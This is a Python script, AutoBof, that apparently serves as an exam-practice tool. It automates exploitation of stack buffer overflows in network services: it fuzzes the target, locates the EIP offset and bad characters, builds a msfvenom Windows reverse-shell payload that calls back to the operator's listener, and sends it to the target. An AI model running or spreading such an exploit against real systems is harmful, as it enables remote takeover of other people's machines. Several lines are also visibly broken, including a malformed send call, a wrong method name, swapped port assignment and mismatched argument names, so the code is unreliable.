#!/usr/bin/python3

"""
# Title: AutoBof
# Description: A tool for automating buffer overflow exploitation.
# Version: 1.0
# Created: 20 February 2021
# Last Modified: 10 March 2021
# By: Tarynhacks
"""

import subprocess, socket, time, binascii, argparse, sys, colorama
from colorama import init, Fore

class BadArgumentException(Exception):
    pass


class FailedToFuzzException(Exception):
    pass


class FailedToCreateOffsetException(Exception):
    pass


class BadCharsException(Exception):
    pass


class PayloadException(Exception):
    pass


class ExploitException(Exception):
    pass


class SpaceException(Exception):
    pass


class AutoBof():
    def __init__(self, rhost, rport, pfx, sfx, lhost, lport) -> None:
        self._rhost = rhost
        self._rport = rport
        self._pfx = pfx
        self._sfx = sfx
        self._lhost = lhost
        self._lport = rport
        self._h = ('0123456789ABCDEFabcdef')
        self._nops = b'\x90'
        self._R = "\033[91m"
        self._Y = "\033[93m"
        self._G = "\033[92m"
        self._W = "\033[01m"

        self._handle_args()
        self._run()

    def _run(self):
        offset = self._offset()
        space = self._check_space(offset)
        bcharlist_str, bcharlist = self._check_badchars(offset, space)
        payload, payload_str, eip = self._payload(offset, bcharlist_str)
        time.sleep(1)

        e = input("\nExploit? (Y/N): ")

        if(e.lower() == 'y'):
            self._exploit(payload)

        self._print_poc(offset, eip, space, bcharlist_str, payload_str, payload)

    def _handle_args(self) -> None:
        low_port = 1024
        high_port = 65535

        if not isinstance(self._rhost, str) or not isinstance(self._lhost):
            raise BadArgumentException("rhost or lhost is not a string!")

        if not isinstance(self._rport, str) or not isinstance(self._lport, str):
            if self._rport.isnumeric() and self._lport.isnumeric():
                self._rport = int(self._rport)
                self._lport = int(self._lport)
                
                if not (low_port < self._rport <= high_port) or not (low_port < self._lport <= high_port):
                    raise BadArgumentException(f"rport or lport is not in range ({low_port} - {high_port})")

            raise BadArgumentException("rport or lport is not numeric")

        if isinstance(self._pfx, str) and isinstance(self._sfx, str):
            self._pfx = self._pfx.encode()
            self._sfx = self._sfx.encode()
        
        else:
            raise BadArgumentException("pfx or sfx is not a valid string")

    def _send_bytes(self, data) -> int:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            sock.connect((self._rhost, self._rport))

            if isinstance(data, str):
                data.encode()

            print(sock.recv(1024).decode())
            
            sock.send(self._pfx, + data + self._sfx)

            print(sock.recv(1024).decode())

    def _fuzz(self):
        buffer = []
        counter = 100

        while len(buffer) < 30:
            buffer.append('A' * counter)
            counter += 100

        for string in buffer:
            try:
                print(f"{self._W}[+] Fuzzing with {str(len(string))} bytes...{self._W}")
                self._send_bytes(string + "\r\n")
                time.sleep(1)

            except ConnectionRefusedError as e:
                raise FailedToFuzzException(f"{self._R}\n[-] Can't connect : {e} {self._R}")
                
            except socket.timeout:
                print(f"{self._G}[+] Crashed at offset {str(len(string))}!{self._G}")
                return len(string)

    def _offset(self):
        offset = self._fuzz()

        input(f"{self._Y}[!] WAITING - [Restart the app]{self._Y}" + Fore.RESET)

        try:
            p = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
            self.send_bytes('A' * (offset - 100) + p + '\r\n')

        except ConnectionRefusedError:
            raise FailedToCreateOffsetException(f"{self._R}\n[-] Can't connect.{self._R}")
        
        except socket.timeout:
            print(f"{self._G}\n[+] Crashed at offset {offset}!{self._G}{self._Y}\n[!] - WAITING - Check EIP{self._Y}")
        
        eip = input("EIP: ")
        eip = self._little_endian(eip, "EIP: ")

        try:
            p.index(bytes.fromhex(eip).decode())

        except ValueError:
            eip = self._little_endian(eip, "")
            raise FailedToCreateOffsetException(f"{self._R}\n[-] Unable to find a matching offset at address 0x{eip}.{self._R}")

        else:
            offset = (offset - 100) + p.index(bytes.fromhex(eip).decode())
            print(f"{self._G}\n[+] Identified exact offset at {offset}!{self._G}")
            return offset

    def _little_endian(self, e, s):
        e = self._check_address(e, s)
        e = [e[i:i+2] for i in range(0,8, 2)]
        e.reverse()
        return ''.join(e)

    def _check_address(self, a, s):
        while len(a) !=8 or any((char not in self._h) for char in a):
            print(f"{self._Y}\n[!] INVALID FORMAT - Re-enter address in form of 01AB23CD.{self._Y}")
            a = input(f"{s}")
        return a

    def _check_space(self, offset):
        input(f"{self._Y}[!] WAITING - [Restart the app]{self._Y}" + Fore.RESET)
        
        try:
            print(f"{self._W}\n[+] Determining space in ESP...{self._W}")
            self._send_bytes('A' * offset + 'BBBB' + 'C' * 1000 + "\r\n")

        except ConnectionRefusedError:
            raise SpaceException(f"{self._R}\n[-] Can't connect.{self._R}")

        except socket.timeout:
            print(f"{self._G}\n[+] Crashed at offset {offset}!{self._G}{self._Y}\n[!] - WAITING - Check ESP{self._Y}")
        
        e = input("ESP: ")
        e = self._check_address(e, "ESP: ")
        print(f"{self._Y}\n[!] WAITING - Check last address containing C's in the stack window.{self._Y}")
        
        s = input("Last address: ")
        s = self._check_address(s, "Last address: ")
        space = int(s, 16) - int(e, 16)
        print(f"{self._G}\n[+] You have {space} bytes of space in ESP for a payload!{self._G}")

        return space

    def _check_char(self, bcharlist, bc):
        if not bc:
            print(f"{self._G}\n[+] Badchars set!{self._G}")
            print(f"{''.join(bcharlist)}")
            return True

        if bc in bcharlist:
            print(f"{self._Y}\n[!] {bc} is already in your badchar list! - Re-enter badchar in form of \\x00.{self._Y}")
        
        elif len(bc) != 4 or bc[0] != '\\' or bc[1] != 'x' or bc[2] not in self._h or bc[3] not in self._h:
            print(f"{self._Y}\n[!] INVALID FORMAT - Re-enter badchar in form of \\x00.{self._Y}")
        
        else:
            bcharlist.append(bc)
            return True

        return False

    def _generate_badchars(self, bad_chars, bc):
        bad_chars = binascii.hexlify(bad_chars).decode()
        bad_chars = bad_chars.replace(bc[2:], "")
        bad_chars = binascii.unhexlify(bad_chars.encode())
        return bad_chars

    def _check_badchars(self, offset, space):
        bad_chars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
        bcharlist = ['\\x00']

        if space < (255 - 32):
            sys.exit(f"{self._R}\n[-] Not enough space to send all badchars at once.{self._R}")

        input(f"{self._Y}[!] WAITING - [Restart the app]{self._Y}" + Fore.RESET)

        for i in range(255):
            try:
                print(f"{self._W}\n[+] Sending badchar test...{self._W}")
                self._send_bytes(b'A' * offset + b'BBBB' + self._nops * 16 + bad_chars + self._nops * 16 + b"\r\n")

            except ConnectionRefusedError:
                raise BadCharsException(f"{self._R}\n[-] Can't connect.{self._R}")

            except socket.timeout:
                print(f"{self._G}\n[+] Crashed at offset {offset}!{self._G}{self._Y}\n[!] - WAITING - Check badchars one at a time.{self._Y}")
                print("Hint: [right-click ESP > Follow in Dump]")
                print(f"{self._W}\n[+] Current badchar list: {''.join(bcharlist)}{self._W}")
                bc = input("Badchar [Press Enter if none left]: ").lower()
                
                while self._check_char(bcharlist, bc) == False:
                    bc = input("Badchar [Press Enter if none left]: ").lower()

            if not bc:
                break

            bad_chars = self._generate_badchars(bad_chars, bc)
            input(f"{self._Y}\n[!] WAITING - [Restart the app]{self._Y}" + Fore.RESET)

        return ''.join(bcharlist), bcharlist

    def _payload(self, offset, bcharlist_str):
        print(f"{self._Y}\n[!] WAITING - Choose your return address to overwrite EIP.{self._Y}")
        print("Hint: [!mona jmp -r esp -cpb '\\xYY\\xYY\\xYY' (insert badchars)]")

        eip = input("EIP: ")
        eip = self._little_endian(eip, "EIP: ")
        eip2 = eip
        eip = binascii.unhexlify(eip.encode())
        print(f"{self._W}\n[+] Assembling payload...{self._W}")

        try:
            cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={self._lhost} LPORT={self._lport} EXITFUNC=thread -b \'{bcharlist_str}\' -f raw 2>/dev/null"
            shellcode = subprocess.check_output(cmd, shell=True)
            payload = b'A'*offset + eip + self._nops*16 + shellcode + self._nops*16 + b"\r\n"
            eip = f"\\x{eip2[:2]}\\x{eip2[2:4]}\\x{eip2[4:6]}\\x{eip2[6:]}"
            payload_str = f"({self._pfx} + b\'A\'*{offset} + b\'\\x{eip2[:2]}\\x{eip2[2:4]}\\x{eip2[4:6]}\\x{eip2[6:]}\' + b\'90\'*16 + <shellcode> + b\'90\'*16 + {self._sfx} + b\'\\r\\n\')"
            
            print(f"{self._G}\n[+] Assembled!{self._G}")

        except:
            raise PayloadException(f"{self._R}\nCan't assemble. Do you have msfvenom installed?{self._R}")

        return payload, payload_str, eip

    def _exploit(self, payload):
        print(f"{self._W}\n[!] Remember to start your listener on port {self._lport}!{self._W}")
        input(f"{self._Y}[!] WAITING - [Restart the app]{self._Y}" + Fore.RESET)
        
        try:
            print(f"{self._W}\n[+] Sending exploit...{self._W}")
            self._send_bytes(payload)

        except ConnectionRefusedError:
            raise ExploitException(f"{self._R}\n[-] Can't connect.{self._R}")

        except socket.timeout:
            print(f"{self._G}\n[+] Exploit sent!{self._G}")

    def _print_poc(self, offset, eip, space, bcharlist_str, payload_str, payload):
        print(f"{self._W}\n[+] Congrats, you autoboffed this box! Now try building the PoC on your own!{self._W}")
        print(f"{self._W}\nSummary:{self._W}")
        print(f"\tEIP Offset: {offset} bytes")
        print(f"\tEIP Overwrite: {eip}")
        print(f"\tSpace for payload: {space}")
        print(f"\tBadchars found: {bcharlist_str}")
        print(f"\tPayload sent: {payload_str}")


def display_banner() -> None:
    with open("banner", 'r') as fp:
        banner = fp.read()
        print(banner)

def handle_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--rhost", help = "target ip address", required = True)
    parser.add_argument("--rport", help = "target port", required = True)
    parser.add_argument("--prefix", help = "string prefix [default: \"\"]", default = "")
    parser.add_argument("--suffix", help = "string suffix [default: \"\"]", default = "")
    parser.add_argument("--lhost", help = "listening ip address [default: tun0]", default = "tun0")
    parser.add_argument("--lport", help = "listening port [default: 443]", default = 443)
    return parser.parse_args()

def main() -> int:
    try:
        colorama.init()
        init(autoreset=True)

        display_banner()
        args = handle_args()
        
        AutoBof(args.rhost, args.rport, args.pfx, args.sfx, args.lhost, args.lport)
        print("\nIt has been an honor serving you.\n\tAutobof, rollout.")

        return 0

    except BadArgumentException as e:
        print(f"Autobof Failed due to a bad argument: {e}")

    except FailedToFuzzException as e:
        print(f"AutoBof Failed at fuzzing: {e}")

    except FailedToCreateOffsetException as e:
        print(f"AutoBof Failed creating offset: {e}")

    except BadCharsException as e:
        print(f"AutoBof Failed at badchars: {e}")

    except PayloadException as e:
        print(f"AutoBof Failed at creating the payload: {e}")

    except ExploitException as e:
        print(f"AutoBof Failed running the exploit: {e}")

    except SpaceException as e:
        print(f"AutoBof Failed generating space: {e}")

    finally:
        sys.exit()



if __name__ == "__main__":
    main()